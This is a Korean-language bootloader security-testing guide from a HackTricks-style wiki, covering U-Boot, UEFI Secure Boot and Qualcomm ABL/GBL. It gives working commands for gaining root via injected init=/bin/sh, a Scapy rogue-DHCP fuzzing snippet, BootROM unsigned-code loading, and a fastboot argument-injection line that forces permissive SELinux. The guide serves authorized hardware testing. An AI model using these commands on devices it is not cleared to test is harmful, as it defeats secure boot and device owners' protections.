# Bootloader Testing

{{#include ../../banners/hacktricks-training.md}}

다음 단계는 device startup configuration을 수정하고 U-Boot 및 UEFI-class loader와 같은 bootloader를 테스트할 때 권장됩니다. 초기 code execution 확보, signature/rollback protection 평가, recovery 또는 network-boot 경로 악용에 중점을 둡니다.

Related: bl2_ext patching을 통한 MediaTek secure-boot bypass:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot quick wins 및 environment abuse

1. interpreter shell에 접근
- boot 중 `bootcmd`가 실행되기 전에 알려진 break key(일반적으로 아무 키, 0, space 또는 board별 "magic" sequence)를 눌러 U-Boot prompt로 진입합니다.

2. boot state 및 variables 확인
- 유용한 commands:
- `printenv` (environment dump)
- `bdinfo` (board info, memory addresses)
- `help bootm; help booti; help bootz` (지원되는 kernel boot methods)
- `help ext4load; help fatload; help tftpboot` (사용 가능한 loaders)

3. root shell을 얻도록 boot arguments 수정
- 일반 init 대신 kernel이 shell로 진입하도록 `init=/bin/sh`를 추가합니다.
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # 또는: run bootcmd
```

4. TFTP server에서 netboot
- network를 구성하고 LAN에서 kernel/fit image를 가져옵니다.
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. environment를 통한 변경 사항 persist
- env storage가 write-protected되지 않았다면 control을 persist할 수 있습니다.
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- fallback path에 영향을 주는 `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets`와 같은 variables를 확인합니다. 잘못 구성된 값으로 인해 shell로 반복해서 break할 수 있습니다.

6. debug/unsafe features 확인
- 다음을 확인합니다: `bootdelay` > 0, `autoboot` disabled, 제한 없는 `usb start; fatload usb 0:1 ...`, serial을 통한 `loady`/`loads` 기능, untrusted media에서 `env import`, signature check 없이 로드되는 kernels/ramdisks.

7. U-Boot image/verification testing
- platform이 FIT images를 사용한 secure/verified boot를 지원한다고 주장하면 unsigned 및 tampered images를 모두 시도합니다.
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # FIT sig가 enforced된 경우 FAIL이어야 함
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # FAIL이어야 함
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # key가 trusted된 경우에만 boot되어야 함
```
- `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE`가 없거나 legacy `verify=n` 동작이 존재하면 arbitrary payload를 boot할 수 있는 경우가 많습니다.
- 단순한 allow/deny 결과에서 멈추지 마세요. 최근 FIT research에 따르면 verification path 자체가 pre-auth attack surface가 될 수 있습니다. externally stored FIT data(`data-offset`, `data-position`, `data-size`), signed configuration selection, `loadables`, overlay / `extra-conf` handling에 대해 negative test를 수행합니다.
- 일치하는 source tree가 있다면 실제 hardware를 다루기 전에 `test/vboot/vboot_test.sh`를 사용하여 U-Boot sandbox에서 FIT verification behaviour를 빠르게 재현할 수 있습니다.

8. Standard Boot(`bootstd`), `extlinux` 및 script bootflows
- 최신 U-Boot builds에서 `bootcmd`는 Standard Boot의 wrapper인 경우가 많습니다. 따라서 visible environment가 안전해 보이더라도 writable media, PXE 또는 SPI flash가 실제 trust boundary가 될 수 있습니다.
- `extlinux` bootmeth는 `/` 및 `/boot` 아래에서 `extlinux/extlinux.conf`를 검색합니다. script bootmeth는 먼저 `boot.scr.uimg`를 검색한 다음 `boot.scr`를 검색합니다. network boot에서는 script filename이 `boot_script_dhcp`에서 제공될 수 있습니다.
- 유용한 triage commands:
```
# bootflow scan -l
# bootflow list
# bootflow select 0; bootflow info -d
# bootmeth list
# bootmeth order "extlinux script pxe"
```
- 테스트할 abuse cases: `boot_targets`에서 attacker-controlled USB/SD media가 더 앞에 있는 경우, writable `/boot/extlinux/extlinux.conf`, rogue TFTP가 `boot.scr`를 제공하는 경우, `script_offset_f`를 통한 SPI-backed script execution.
- platform이 FIT verification에 의존한다면 configuration이 image별로만 서명된 것이 아니라 configuration level에서도 서명되었는지 확인합니다. `required-mode=all`은 단일 required key만 허용하는 것보다 강력합니다.

## Network-boot surface(DHCP/PXE) 및 rogue servers

9. PXE/DHCP parameter fuzzing
- U-Boot의 legacy BOOTP/DHCP handling에는 memory-safety issue가 발생한 사례가 있습니다. 예를 들어 CVE-2024-42040은 crafted DHCP responses를 통한 memory disclosure를 설명하며, U-Boot memory의 bytes를 network로 leak할 수 있습니다. 지나치게 길거나 edge-case인 values(option 67 bootfile-name, vendor options, file/servername fields)를 사용하여 DHCP/PXE code paths를 테스트하고 hangs/leaks를 관찰합니다.
- netboot 중 boot parameters를 stress하기 위한 최소 Scapy snippet:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# 의도적으로 oversized하고 이상한 values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- 또한 PXE filename fields가 OS-side provisioning scripts로 chain될 때 sanitization 없이 shell/loader logic으로 전달되는지 검증합니다.

10. Rogue DHCP server command injection testing
- rogue DHCP/PXE service를 설정하고 filename 또는 options fields에 characters를 injection하여 boot chain의 이후 stages에서 command interpreters에 도달할 수 있는지 시도합니다. Metasploit의 DHCP auxiliary, `dnsmasq` 또는 custom Scapy scripts가 적합합니다. 먼저 lab network를 격리해야 합니다.

## Normal boot를 override하는 SoC ROM recovery modes

많은 SoC는 flash images가 invalid한 경우에도 USB/UART를 통해 code를 받아들이는 BootROM "loader" mode를 제공합니다. secure-boot fuses가 blown되지 않았다면 chain의 매우 초기 단계에서 arbitrary code execution을 제공할 수 있습니다.

- NXP i.MX(Serial Download Mode)
- Tools: `uuu`(mfgtools3) 또는 `imx-usb-loader`.
- Example: `imx-usb-loader u-boot.imx`를 사용하여 custom U-Boot를 RAM에 push하고 실행합니다.
- Allwinner(FEL)
- Tool: `sunxi-fel`.
- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` 또는 `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip(MaskROM)
- Tool: `rkdeveloptool`.
- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin`을 사용하여 loader를 stage하고 custom U-Boot를 upload합니다.

device에 secure-boot eFuses/OTP가 burned되었는지 평가합니다. 그렇지 않다면 BootROM download modes는 첫 번째 stage payload를 SRAM/DRAM에서 직접 실행하여 higher-level verification(U-Boot, kernel, rootfs)을 자주 우회합니다.

## UEFI/PC-class bootloaders: quick checks

11. ESP tampering, rollback 및 key-enrollment testing
- EFI System Partition(ESP)을 mount하고 loader components를 확인합니다: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo paths.
- 가능한 경우 OS에서 Secure Boot state와 key databases를 dump합니다.
```bash
mokutil --sb-state
efi-readvar -v PK
efi-readvar -v KEK
efi-readvar -v db
efi-readvar -v dbx
```
- platform이 Setup Mode에 있거나 unauthenticated key enrollment를 허용하거나 test/default Platform Key(PKfail class)와 함께 제공된다면 local admin 또는 physical attacker가 자신의 KEK/db를 enroll할 수 있습니다. 그러면 Secure Boot가 "enabled"로 보이는 상태를 유지하면서 arbitrary EFI binaries를 boot할 수 있습니다.
- Secure Boot revocations(dbx)이 최신이 아니라면 downgraded 또는 알려진 vulnerable signed boot components를 사용한 boot를 시도합니다. platform이 여전히 old shims/bootmanagers를 trust한다면 ESP에서 자체 kernel 또는 `grub.cfg`를 로드하여 persistence를 확보할 수 있습니다.

12. Stale shim / SBAT / dbx revocation testing
- Old Microsoft-signed shims와 vendor forks는 revocations가 stale한 경우에도 BYOVD-style bootkit path로 동작할 수 있습니다. 격리된 lab에서 historically vulnerable한 shim을 ESP에 배치하고 자체 `grubx64.efi` 또는 kernel을 chainload해 봅니다.
- 빠른 triage:
```bash
sbverify --list shimx64.efi
objdump -s -j .sbat shimx64.efi | less
efibootmgr -v
```
- shim이 revocation list에 있음에도 여전히 실행된다면 firmware/OS에 stale `dbx` updates가 있거나 upstream SBAT protections를 상속하지 않은 forked loader를 trust하는 것입니다.

13. Boot logo parsing bugs(LogoFAIL class)
- 여러 OEM/IBV firmwares가 boot logos를 처리하는 DXE의 image-parsing flaws에 취약했습니다. attacker가 vendor-specific path(예: `\EFI\<vendor>\logo\*.bmp`) 아래 ESP에 crafted image를 배치하고 reboot할 수 있다면 Secure Boot가 enabled된 경우에도 early boot 중 code execution이 가능할 수 있습니다. platform이 user-supplied logos를 허용하는지, 그리고 해당 paths가 OS에서 writable한지 테스트합니다.


## Android/Qualcomm ABL + GBL(Android 16) trust gaps

Qualcomm의 ABL을 사용하여 **Generic Bootloader Library(GBL)** 를 로드하는 Android 16 devices에서는 ABL이 `efisp` partition에서 로드하는 UEFI app을 **authenticate**하는지 검증합니다. ABL이 UEFI app의 **presence**만 확인하고 signatures를 verify하지 않는다면 `efisp`에 write primitive를 확보하는 것만으로 **pre-OS unsigned code execution**이 boot 시 가능해집니다.

실용적인 checks 및 abuse paths:

- **efisp write primitive**: custom UEFI app을 `efisp`에 write할 방법이 필요합니다(root/privileged service, OEM app bug, recovery/fastboot path). 이것이 없다면 GBL loading gap에 직접 접근할 수 없습니다.
- **fastboot OEM argument injection**(ABL bug): 일부 builds는 `fastboot oem set-gpu-preemption`에 추가 tokens를 허용하고 kernel cmdline에 append합니다. 이를 사용하여 permissive SELinux를 강제하고 protected partition writes를 활성화할 수 있습니다.
```bash
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```
device가 patched되었다면 command는 extra arguments를 reject해야 합니다.
- **persistent flags를 통한 Bootloader unlock**: boot-stage payload가 persistent unlock flags(예: `is_unlocked=1`, `is_unlocked_critical=1`)를 변경하여 OEM server/approval gates 없이 `fastboot oem unlock`을 emulate할 수 있습니다. 이는 다음 reboot 이후에도 지속되는 posture change입니다.

Defensive/triage notes:

- ABL이 `efisp`의 GBL/UEFI payload에 대해 signature verification을 수행하는지 확인합니다. 그렇지 않다면 `efisp`를 high-risk persistence surface로 취급합니다.
- ABL fastboot OEM handlers가 **argument counts를 validate**하고 additional tokens를 reject하도록 patched되었는지 확인합니다.

## Hardware caution

early boot 중 SPI/NAND flash와 상호작용할 때(예: reads를 우회하기 위해 pins를 grounding할 때) 주의하고 항상 flash datasheet를 참조합니다. timing이 맞지 않는 shorts는 device 또는 programmer를 손상시킬 수 있습니다.

## Notes and additional tips

- `env export -t ${loadaddr}` 및 `env import -t ${loadaddr}`를 사용하여 RAM과 storage 사이에서 environment blobs를 이동해 봅니다. 일부 platforms는 authentication 없이 removable media에서 env import를 허용합니다.
- `extlinux.conf`를 통해 boot하는 Linux-based systems에서 boot partition의 `APPEND` line을 수정하여(`init=/bin/sh` 또는 `rd.break`를 injection) signature checks가 enforced되지 않는 경우 persistence를 확보할 수 있습니다.
- target이 dual-slot / A/B updates를 사용한다면 [firmware analysis overview](README.md)의 anti-rollback 및 slot-desync techniques를 검토하여 bootloader 자체 외부의 updater-only trust gaps를 놓치지 않도록 합니다.
- userland가 `fw_printenv/fw_setenv`를 제공한다면 `/etc/fw_env.config`가 실제 env storage와 일치하는지 검증합니다. 잘못 구성된 offsets로 인해 잘못된 MTD region을 read/write할 수 있습니다.

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [https://source.android.com/docs/core/architecture/bootloader/generic-bootloader](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [https://kb.cert.org/vuls/id/616257](https://kb.cert.org/vuls/id/616257)
{{#include ../../banners/hacktricks-training.md}}
